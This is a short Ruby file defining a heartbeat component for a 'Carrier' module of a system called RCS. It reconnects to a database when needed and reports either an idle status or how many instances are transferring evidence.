require 'rcs-common/trace'
require 'rcs-common/systemstatus'
require 'rcs-common/heartbeat'

module RCS
  module Carrier
    class HeartBeat < RCS::HeartBeat::Base
      component :carrier

      def perform
        # if the database connection has gone
        # try to re-login to the database again
        unless DB.instance.connected?
          trace :debug, "heartbeat: try to reconnect to rcs-db"
          DB.instance.connect!(:carrier)
        end

        # still no luck ? return and wait for the next iteration
        return unless DB.instance.connected?

        message = if EvidenceTransfer.instance.threads > 0
          "Transferring evidence for #{EvidenceTransfer.instance.threads} instances"
        else
          "Idle"
        end

        return [OK, message]
      end
    end
  end
end
